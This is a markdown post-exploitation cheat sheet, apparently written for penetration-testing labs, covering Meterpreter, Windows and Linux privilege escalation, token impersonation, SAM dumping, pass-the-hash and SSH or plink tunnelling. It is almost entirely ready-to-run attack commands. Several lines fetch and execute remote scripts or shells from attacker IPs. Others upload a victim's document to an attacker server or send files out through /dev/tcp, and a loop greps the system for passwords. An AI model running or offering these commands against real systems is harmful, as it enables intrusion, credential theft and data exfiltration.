## Meterpreter
### Enumerators
```
run post/multi/recon/local_exploit_suggester
```
### Get Powershell
```
load powershell
powershell_shell
```
### Port forward
```
portfw add -l 455 -p 455 -r 127.0.0.1
```
### Rotten Potato
```
load incognito
list_tokens -u
execute -cH -f rottenpotato.exe
impersonate_token BUILTIN\Administrators
```

## Windows
### Manual
```
whoami /all
net user
hostname
systeminfo
tasklist /SVC
ipconfig /all
route print
netstat -ano
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
schtasks /query /fo LIST /v
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn
accesschk.exe -uws "Everyone" "C:\Program Files"
powershell -c "driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path"
powershell -c "Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like '*VMware*'}"
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```
### Script
```
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PowerUp.ps1') | powershell -noprofile -
certutil -urlcache -split -f http://192.168.119.199/windows-privesc-check2.exe
```

### Check permission
```
Get-ACL administrator | Fl *
icacls "file"
```

### Run as user
```
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.3/shell')" -Credential $cred
```

### Run as NTAuth/System from local admin
```
PsExec.exe -accepteula -i -s %SystemRoot%\System32\cmd.exe
```

### Change file permission
```
cacls root.txt /t /e /p Alfred:F
```

### Get sam
```
reg save hklm\sam c:\sam
reg save hklm\system c:\system
```

### With NTLM hash
```
pth-winexe -U jeeves/administrator //10.10.10.63 cmd.exe
```

### Juicy Potato
```
JuicyPotato.exe -l 7777 -p C:\Users\Public\hope.exe -t *
```

### smbserver.py
On attacker machine
```
sudo smbserver.py quang `pwd`
```

On victim machine
```
New-PSDrive -Name "yoyo" -PSProvider FileSystem -Root "\\10.10.14.3\quang"
cd yoyo:
```
### wget
```
certutil -urlcache -f http://123.123.123.123/file c:/user/administrator/file
```
or Create ps file with
```
$client = new-object System.Net.WebClient
$client.DownloadFile("http://10.10.14.3/shell.exe","C:\users\kohsuke\shell.exe")
```

### Upload
```
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.199/upload.php', 'important.docx')
```

## Bash
```
sockstat -l
cat .bash_history
history
sudo -l
```

### Sniffing
```
ssh 10.10.14.3@10.10.10.119 "tcpdump -i any -U -s0 -w - 'not port 22'" | wireshark -k -i -
```

### port forward
Attacker to victim
```
ssh -L attackerport:127.0.0.1:victimport user@domain
```
Change your ssh port to bypass firewall
```
sudo gedit /etc/ssh/sshd_config
```
Victim to attacker
```
ssh -R attackerport:127.0.0.1:victimport user@attacker
```
Windows victim to att
```
cmd.exe /c echo y | plink.exe -ssh -l kali -pw kali -R 192.168.119.199:1234:127.0.0.1:8080 -p 80 192.168.119.199
plink.exe -ssh -l kali -pw kali -R 192.168.119.199:1234:127.0.0.1:8080 -P 80 192.168.119.199
```
Dynamic
```
ssh -v -N -D 9050 sean@10.11.1.251
sudo proxychains nmap -T4 -p- -sT -Pn 10.1.1.27
```
nfs tunneling
https://biowiki.org/wiki/index.php/Mounting_NFSThrough_SSHTunnel

### Move file
```
cat file > /dev/tcp/10.10.14.3/1234
```

### Find all world-writable files
```
find /bin -perm -o+w -print 2>/dev/null
```

### Find credentials
```
grep -lRi "password" ./etc 2>/dev/null | sort | uniq > files.txt
for p in $(cat files.txt); do grep password $p; done
```

## Others
### LinEnum
### linuxprivchecker.py
### pspy32
Find scheduled jobs without root
### windows exploit suggester
```
python windows-exploit-suggester.py --database 2020-05-19-mssb.xls --systeminfo systeminfo.txt
```
### https://www.fuzzysecurity.com/tutorials/16.html
